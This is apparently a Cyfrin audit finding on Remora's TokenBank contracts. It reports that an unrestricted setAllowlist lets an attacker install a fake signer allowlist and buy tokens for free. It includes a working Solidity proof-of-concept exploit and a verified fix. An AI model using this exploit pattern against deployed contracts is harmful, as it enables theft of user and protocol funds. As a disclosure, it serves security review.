---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-10-22-cyfrin-remora-dynamic-tokens-v2-1-0-0
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2025-10-22T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md
tags:
- firm:cyfrin
- report:2025-10-22-cyfrin-remora-dynamic-tokens-v2-1
title: '`SignatureValidator::setAllowlist` is unrestricted leading to free purchases
  of tokens'
vuln_class: []
---

# `SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md)_

---

**Description:** `SignatureValidator::setAllowlist` is unrestricted.

Since `SignatureValidator` inherited by `ReferralManager` and `TokenBank` this has downstream consequences.

For `TokenBank` in particular this means that
- attacker can call `TokenBank::setAllowlist(maliciousAllowList)` where `maliciousAllowList::isSigner`  just returns `true` for the attacker
- They can then spoof a signature by a Remora admin
- call `TokenBank::buyTokenOCP` using the spoofed signature
- `buyTokenOCP` indirectly calls `_buyToken` with `useStableCoin == false`
- thus the entire code path guarded by `if (useStablecoin) {` is skipped and no stablecoins are transferred from the attacker

The same vulnerability could be used to steal all of `ReferralManager`'s bonuses.

**Impact:** Attacker can
- purchase all remaining central tokens for free
- steal from `ReferralManager` bonuses

**Proof of Concept:** The PoC below  demonstrates the buying of central tokens for free.

Add `MaliciousAllowlist.sol`
```solidity
contract MaliciousAllowlist {

    address maliciousSigner;

    constructor(address _maliciousSigner) {
        maliciousSigner = _maliciousSigner;
    }

    function isSigner(address signer) public view returns (bool) {
        return (signer == maliciousSigner);
    }

}
```

And then add this test to `TokenBankTest.t.sol` (after adding import of `MaliciousSigner`)

```solidity
    function test_cyfrin_buyTokenOCP_for_free() public {
        uint64 TOTAL_TOKENS = 10_000;
        _addCentralToTokenBank(60e6, true, 50_000);

        centralTokenProxy.mint(address(tokenBankProxy), uint64(TOTAL_TOKENS));
        address attacker = getDomesticUser(2);

        (address attackerSigner, uint256 sk) = makeAddrAndKey("BUY_SIGNER");


        /*
         * Attacker sets a malicious Allowlist and signs the buy instead of a Remora Admin
         */
        vm.startPrank(attackerSigner);
        MaliciousAllowlist maliciousAllowlist = new MaliciousAllowlist(attackerSigner);
        tokenBankProxy.setAllowlist(address(maliciousAllowlist));
        bytes32 typeHash = keccak256("BuyToken(address investor, address token, uint256 amount)");
        bytes32 structHash = keccak256(abi.encode(typeHash, attacker, address(centralTokenProxy), uint256(TOTAL_TOKENS)));
        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        vm.stopPrank();

        /*
         * Now attacker buys all the tokens using the signature they created
         */
        vm.prank(attacker);
        tokenBankProxy.buyTokenOCP(attackerSigner, address(centralTokenProxy), TOTAL_TOKENS, sig);
        // attacker receives domestic child tokens
        assertEq(d_childTokenProxy.balanceOf(attacker), TOTAL_TOKENS);
    }
```

**Recommended Mitigation:** Since `SignatureValidator` is an abstract contract, `setAllowlist` should be an internal function.

```diff
-    function setAllowlist(address allowlist) external {
+    function _setAllowlist(address allowlist) internal {
        if (allowlist == address(0)) revert InvalidAddress();
        SVStorage storage $ = _getSVStorageStorage();
        if ($._allowlist != allowlist) {
            $._allowlist = allowlist;
            emit AllowlistSet(allowlist);
        }
    }
```

`TokenBank` should then expose `setAllowlist` as an external function with the `restricted` modifier

```diff
+   function setAllowlist(address signer) external restricted {
+       super._setAllowlist(signer);
+   }
```

**Remora:** Fixed at commit [cc447da](https://github.com/remora-projects/remora-dynamic-tokens/commit/cc447da9fca1a997ffbb34f4d099be8f7dce7133)

**Cyfrin:** Verified. `setAllowlist()` is now restricted.
